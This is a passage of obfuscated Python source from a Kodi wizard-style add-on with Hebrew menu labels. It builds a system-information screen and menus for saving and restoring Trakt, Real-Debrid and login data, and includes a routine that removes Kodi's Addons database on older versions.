	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00OO0O00O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2719
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00OO0O00O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2720
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2722
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00OOO0000O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2723
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO00O00O0OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2724
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O00OOO0000O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2725
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2727
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000000O000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2728
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOO000O00O00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2729
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0OOOO00O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2730
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2732
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00OO0O00O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2733
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0OOO000OOO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2734
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0OOOOOO0O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2735
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO000OOOO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2736
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00OO0O00O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2737
	O0OOOO00000000O00 =len (O00000OOO0O0O0O00 )+len (OO000OOOO0O000OOO )+len (O0O000OO00000O0O0 )+len (OO00OO0O00O0OOO00 )+len (O0O0O00OO00O0O00O )+len (OO0OO000O000O00OO )+len (O00OOOO000000000O )#line:2739
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0OOOO00000000O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2740
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O000OO00000O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2741
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00OO0O00O0OOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2742
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO000OOOO0O000OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2743
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00000OOO0O0O0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2744
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOOO000000000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2745
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO000O000O00OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2746
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O00OO00O0O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2747
def Menu ():#line:2748
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2749
def saveMenu ():#line:2751
	O00O0OOOO0O00000O ='[COLOR green]מופעל[/COLOR]';O00OO00O00OO0OOO0 ='[COLOR red]מבוטל[/COLOR]'#line:2753
	OOOO0O0000OOO00O0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2754
	OO00O000OOOO0OO0O ='true'if KEEPMOVIELIST =='true'else 'false'#line:2755
	OOO0OOOO000000O0O ='true'if KEEPINFO =='true'else 'false'#line:2756
	OO0OO00O0O00O0O0O ='true'if KEEPSOUND =='true'else 'false'#line:2758
	OO0O00OO0OOOO000O ='true'if KEEPVIEW =='true'else 'false'#line:2759
	O000O0O0OO0O0OO0O ='true'if KEEPSKIN =='true'else 'false'#line:2760
	O000000000OO00O0O ='true'if KEEPSKIN2 =='true'else 'false'#line:2761
	O00OOOOO0OOO0O0OO ='true'if KEEPSKIN3 =='true'else 'false'#line:2762
	O00OO0O0OOOO0000O ='true'if KEEPADDONS =='true'else 'false'#line:2763
	OOO0O00000OO00O0O ='true'if KEEPPVR =='true'else 'false'#line:2764
	OOO0O000000O0OOOO ='true'if KEEPTVLIST =='true'else 'false'#line:2765
	OOOOO0OOOOOOOOOOO ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2766
	OOO00O0O0OO0O0OOO ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2767
	OO00O0OOO000OO00O ='true'if KEEPHUBTV =='true'else 'false'#line:2768
	O00OOOO0000OO00OO ='true'if KEEPHUBVOD =='true'else 'false'#line:2769
	OOO00O0OOOO0OOO0O ='true'if KEEPHUBKIDS =='true'else 'false'#line:2770
	O00O0OOO00O00OOO0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2771
	OO00O0OO0OO000OO0 ='true'if KEEPHUBMENU =='true'else 'false'#line:2772
	O00OO0O0OOO000OO0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:2773
	OO0OO0OOOO00OOO0O ='true'if KEEPTRAKT =='true'else 'false'#line:2774
	OOOOO00OO0OO000OO ='true'if KEEPREAL =='true'else 'false'#line:2775
	OO0OOOO0000OOOOO0 ='true'if KEEPRD2 =='true'else 'false'#line:2776
	OO0OO0OOOOO000O00 ='true'if KEEPTORNET =='true'else 'true'#line:2777
	OOO00O00OO0OO0O00 ='true'if KEEPLOGIN =='true'else 'false'#line:2778
	OOOO00000O0O00OOO ='true'if KEEPSOURCES =='true'else 'false'#line:2779
	O0O00000O0O0000OO ='true'if KEEPADVANCED =='true'else 'false'#line:2780
	OOOOO0O0OO0O00000 ='true'if KEEPPROFILES =='true'else 'false'#line:2781
	O0O0O0OOOO0O00000 ='true'if KEEPFAVS =='true'else 'false'#line:2782
	O000000OO0O00O0OO ='true'if KEEPREPOS =='true'else 'false'#line:2783
	OO0000O0O0OO0OOOO ='true'if KEEPSUPER =='true'else 'false'#line:2784
	OOOO000O00O0OO0O0 ='true'if KEEPWHITELIST =='true'else 'false'#line:2785
	addFile ('אפשרויות שמירה קודי אנונימוס','',themeit =THEME3 )#line:2789
	if OOOO000O00O0OO0O0 =='true':#line:2790
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2791
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2792
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2793
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2794
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2795
	addFile ('%s התקנת קיר סרטים: '%OOOO0O0000OOO00O0 .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2797
	addFile ('%s שמירת חשבון RD: '%OOOOO00OO0OO000OO .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2798
	addFile ('%s שמירת חשבון טראקט: '%OO0OO0OOOO00OOO0O .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2799
	addFile ('%s שמירת מועדפים: '%O0O0O0OOOO0O00000 .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2802
	addFile ('%s שמירת לקוח טלוויזיה: '%OOO0O00000OO00O0O .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2803
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%OOO0O000000O0OOOO .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2804
	addFile ('%s שמירת אריח סרטים: '%OOOOO0OOOOOOOOOOO .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2805
	addFile ('%s שמירת אריח סדרות: '%OOO00O0O0OO0O0OOO .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2806
	addFile ('%s שמירת אריח טלויזיה: '%OO00O0OOO000OO00O .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2807
	addFile ('%s שמירת אריח תוכן ישראלי: '%O00OOOO0000OO00OO .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2808
	addFile ('%s שמירת אריח ילדים: '%OOO00O0OOOO0OOO0O .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2809
	addFile ('%s שמירת אריח מוסיקה: '%O00O0OOO00O00OOO0 .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2810
	addFile ('%s שמירת תפריט אריחים ראשי: '%OO00O0OO0OO000OO0 .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2811
	addFile ('%s שמירת כל האריחים בסקין: '%O000O0O0OO0O0OO0O .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2812
	addFile ('%s שמירת הרחבות שהתקנתי: '%O00OO0O0OOOO0000O .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2819
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%OOO0OOOO000000O0O .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2820
	addFile ('%s שמירת ספריית סרטים וסדרות: '%OO00O000OOOO0OO0O .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2823
	addFile ('%s שמירת מקורות וידאו: '%OOOO00000O0O00OOO .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2824
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%OO0OO00O0O00O0O0O .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2825
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%OO0O00OO0OOOO000O .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2827
	addFile ('%s שמירת פליליסט לאודר: '%O00OO0O0OOO000OO0 .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2828
	addFile ('%s שמירת הרחבות ידנית: '%OOOO000O00O0OO0O0 .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2829
	addFile ('%s שמירת הגדרות באפר: '%O0O00000O0O0000OO .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2833
	addFile ('%s שמירת סופר מועדפים: '%OO0000O0O0OO0OOOO .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2834
	addFile ('%s שמירת רשימות ריפו: '%O000000OO0O00O0OO .replace ('true',O00O0OOOO0O00000O ).replace ('false',O00OO00O00OO0OOO0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2835
	setView ('files','viewType')#line:2837
def traktMenu ():#line:2839
	OO0OO0O00O0O00OOO ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2840
	O00OO0OOO0OO0O00O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2841
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2842
	addFile ('Save Trakt Data: %s'%OO0OO0O00O0O00OOO ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2843
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O00OO0OOO0OO0O00O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2844
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2845
	for OO0OO0O00O0O00OOO in traktit .ORDER :#line:2847
		OO00000OOO0O0OO0O =TRAKTID [OO0OO0O00O0O00OOO ]['name']#line:2848
		OOO00O0OOO00OOO0O =TRAKTID [OO0OO0O00O0O00OOO ]['path']#line:2849
		O0OO0O000O000O0OO =TRAKTID [OO0OO0O00O0O00OOO ]['saved']#line:2850
		O0O0000OO000O0OOO =TRAKTID [OO0OO0O00O0O00OOO ]['file']#line:2851
		O0000OO0OOOO000OO =wiz .getS (O0OO0O000O000O0OO )#line:2852
		OOOO0000OOOOOO0OO =traktit .traktUser (OO0OO0O00O0O00OOO )#line:2853
		O00O000000OOO0O0O =TRAKTID [OO0OO0O00O0O00OOO ]['icon']if os .path .exists (OOO00O0OOO00OOO0O )else ICONTRAKT #line:2854
		OOOO0OO0O00O0OO00 =TRAKTID [OO0OO0O00O0O00OOO ]['fanart']if os .path .exists (OOO00O0OOO00OOO0O )else FANART #line:2855
		OO0O00O0O00OO00OO =createMenu ('saveaddon','Trakt',OO0OO0O00O0O00OOO )#line:2856
		O0O0000OOOOOO0O00 =createMenu ('save','Trakt',OO0OO0O00O0O00OOO )#line:2857
		OO0O00O0O00OO00OO .append ((THEME2 %'%s Settings'%OO00000OOO0O0OO0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO0OO0O00O0O00OOO )))#line:2858
		addFile ('[+]-> %s'%OO00000OOO0O0OO0O ,'',icon =O00O000000OOO0O0O ,fanart =OOOO0OO0O00O0OO00 ,themeit =THEME3 )#line:2860
		if not os .path .exists (OOO00O0OOO00OOO0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O000000OOO0O0O ,fanart =OOOO0OO0O00O0OO00 ,menu =OO0O00O0O00OO00OO )#line:2861
		elif not OOOO0000OOOOOO0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO0OO0O00O0O00OOO ,icon =O00O000000OOO0O0O ,fanart =OOOO0OO0O00O0OO00 ,menu =OO0O00O0O00OO00OO )#line:2862
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOO0000OOOOOO0OO ,'authtrakt',OO0OO0O00O0O00OOO ,icon =O00O000000OOO0O0O ,fanart =OOOO0OO0O00O0OO00 ,menu =OO0O00O0O00OO00OO )#line:2863
		if O0000OO0OOOO000OO =="":#line:2864
			if os .path .exists (O0O0000OO000O0OOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO0OO0O00O0O00OOO ,icon =O00O000000OOO0O0O ,fanart =OOOO0OO0O00O0OO00 ,menu =O0O0000OOOOOO0O00 )#line:2865
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO0OO0O00O0O00OOO ,icon =O00O000000OOO0O0O ,fanart =OOOO0OO0O00O0OO00 ,menu =O0O0000OOOOOO0O00 )#line:2866
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0000OO0OOOO000OO ,'',icon =O00O000000OOO0O0O ,fanart =OOOO0OO0O00O0OO00 ,menu =O0O0000OOOOOO0O00 )#line:2867
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2869
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2870
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2871
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2872
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2873
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2874
	setView ('files','viewType')#line:2875
def realMenu ():#line:2877
	O00O000OOOO0000OO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2878
	O0OO00000O0OOO0OO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2879
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2880
	addFile ('Save Real Debrid Data: %s'%O00O000OOOO0000OO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2881
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0OO00000O0OOO0OO ),'',icon =ICONREAL ,themeit =THEME3 )#line:2882
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2883
	for O000OOOO000OOOO0O in debridit .ORDER :#line:2885
		O0OO00OO000OO0OOO =DEBRIDID [O000OOOO000OOOO0O ]['name']#line:2886
		OO000O00OO0OOO0OO =DEBRIDID [O000OOOO000OOOO0O ]['path']#line:2887
		OOOO0O0OO0OOO0O0O =DEBRIDID [O000OOOO000OOOO0O ]['saved']#line:2888
		OO0OO0OO000O0OO00 =DEBRIDID [O000OOOO000OOOO0O ]['file']#line:2889
		OOO00OO00O0OO0O00 =wiz .getS (OOOO0O0OO0OOO0O0O )#line:2890
		OO00O00000OOO0OOO =debridit .debridUser (O000OOOO000OOOO0O )#line:2891
		OO0000000O0000O00 =DEBRIDID [O000OOOO000OOOO0O ]['icon']if os .path .exists (OO000O00OO0OOO0OO )else ICONREAL #line:2892
		O00OO0O0O0OO000O0 =DEBRIDID [O000OOOO000OOOO0O ]['fanart']if os .path .exists (OO000O00OO0OOO0OO )else FANART #line:2893
		O0O0OOO00O0OO000O =createMenu ('saveaddon','Debrid',O000OOOO000OOOO0O )#line:2894
		O00O000OO000OOOO0 =createMenu ('save','Debrid',O000OOOO000OOOO0O )#line:2895
		O0O0OOO00O0OO000O .append ((THEME2 %'%s Settings'%O0OO00OO000OO0OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O000OOOO000OOOO0O )))#line:2896
		addFile ('[+]-> %s'%O0OO00OO000OO0OOO ,'',icon =OO0000000O0000O00 ,fanart =O00OO0O0O0OO000O0 ,themeit =THEME3 )#line:2898
		if not os .path .exists (OO000O00OO0OOO0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0000000O0000O00 ,fanart =O00OO0O0O0OO000O0 ,menu =O0O0OOO00O0OO000O )#line:2899
		elif not OO00O00000OOO0OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O000OOOO000OOOO0O ,icon =OO0000000O0000O00 ,fanart =O00OO0O0O0OO000O0 ,menu =O0O0OOO00O0OO000O )#line:2900
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00O00000OOO0OOO ,'authdebrid',O000OOOO000OOOO0O ,icon =OO0000000O0000O00 ,fanart =O00OO0O0O0OO000O0 ,menu =O0O0OOO00O0OO000O )#line:2901
		if OOO00OO00O0OO0O00 =="":#line:2902
			if os .path .exists (OO0OO0OO000O0OO00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O000OOOO000OOOO0O ,icon =OO0000000O0000O00 ,fanart =O00OO0O0O0OO000O0 ,menu =O00O000OO000OOOO0 )#line:2903
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O000OOOO000OOOO0O ,icon =OO0000000O0000O00 ,fanart =O00OO0O0O0OO000O0 ,menu =O00O000OO000OOOO0 )#line:2904
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO00OO00O0OO0O00 ,'',icon =OO0000000O0000O00 ,fanart =O00OO0O0O0OO000O0 ,menu =O00O000OO000OOOO0 )#line:2905
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2907
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2908
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2909
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2910
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2911
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2912
	setView ('files','viewType')#line:2913
def loginMenu ():#line:2915
	O0OO0O00O0O0O0000 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:2916
	OOO00OO0000OOOO00 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:2917
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:2918
	addFile ('Save Login Data: %s'%O0OO0O00O0O0O0000 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:2919
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOO00OO0000OOOO00 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2920
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2921
	for O0OO0O00O0O0O0000 in loginit .ORDER :#line:2923
		O000O0O000OO00OOO =LOGINID [O0OO0O00O0O0O0000 ]['name']#line:2924
		O0O0000OOOO0OO0OO =LOGINID [O0OO0O00O0O0O0000 ]['path']#line:2925
		OOOOOO000O0O0OO0O =LOGINID [O0OO0O00O0O0O0000 ]['saved']#line:2926
		O0OO0O0O0OO00OO00 =LOGINID [O0OO0O00O0O0O0000 ]['file']#line:2927
		O00O00O00O0O0O0OO =wiz .getS (OOOOOO000O0O0OO0O )#line:2928
		OO0O000OOOO00OOOO =loginit .loginUser (O0OO0O00O0O0O0000 )#line:2929
		O0OOOOOOOOOO00OO0 =LOGINID [O0OO0O00O0O0O0000 ]['icon']if os .path .exists (O0O0000OOOO0OO0OO )else ICONLOGIN #line:2930
		O0000O00O000OO00O =LOGINID [O0OO0O00O0O0O0000 ]['fanart']if os .path .exists (O0O0000OOOO0OO0OO )else FANART #line:2931
		O00OO0O0OOO00OOO0 =createMenu ('saveaddon','Login',O0OO0O00O0O0O0000 )#line:2932
		O0O0O0O0O0OO0OO00 =createMenu ('save','Login',O0OO0O00O0O0O0000 )#line:2933
		O00OO0O0OOO00OOO0 .append ((THEME2 %'%s Settings'%O000O0O000OO00OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0OO0O00O0O0O0000 )))#line:2934
		addFile ('[+]-> %s'%O000O0O000OO00OOO ,'',icon =O0OOOOOOOOOO00OO0 ,fanart =O0000O00O000OO00O ,themeit =THEME3 )#line:2936
		if not os .path .exists (O0O0000OOOO0OO0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOOOOOOOOO00OO0 ,fanart =O0000O00O000OO00O ,menu =O00OO0O0OOO00OOO0 )#line:2937
		elif not OO0O000OOOO00OOOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0OO0O00O0O0O0000 ,icon =O0OOOOOOOOOO00OO0 ,fanart =O0000O00O000OO00O ,menu =O00OO0O0OOO00OOO0 )#line:2938
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0O000OOOO00OOOO ,'authlogin',O0OO0O00O0O0O0000 ,icon =O0OOOOOOOOOO00OO0 ,fanart =O0000O00O000OO00O ,menu =O00OO0O0OOO00OOO0 )#line:2939
		if O00O00O00O0O0O0OO =="":#line:2940
			if os .path .exists (O0OO0O0O0OO00OO00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0OO0O00O0O0O0000 ,icon =O0OOOOOOOOOO00OO0 ,fanart =O0000O00O000OO00O ,menu =O0O0O0O0O0OO0OO00 )#line:2941
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0OO0O00O0O0O0000 ,icon =O0OOOOOOOOOO00OO0 ,fanart =O0000O00O000OO00O ,menu =O0O0O0O0O0OO0OO00 )#line:2942
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O00O00O0O0O0OO ,'',icon =O0OOOOOOOOOO00OO0 ,fanart =O0000O00O000OO00O ,menu =O0O0O0O0O0OO0OO00 )#line:2943
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2945
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2946
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2947
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2948
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2949
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2950
	setView ('files','viewType')#line:2951
def fixUpdate ():#line:2953
	if KODIV <17 :#line:2954
		O00OO0OOOO0O0OO0O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:2955
		try :#line:2956
			os .remove (O00OO0OOOO0O0OO0O )#line:2957
		except Exception as O00000OO00O0O0OOO :#line:2958
			wiz .log ("Unable to remove %s, Purging DB"%O00OO0OOOO0O0OO0O )#line:2959
			wiz .purgeDb (O00OO0OOOO0O0OO0O )#line:2960
	else :#line:2961
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:2962
def removeAddonMenu ():#line:2964
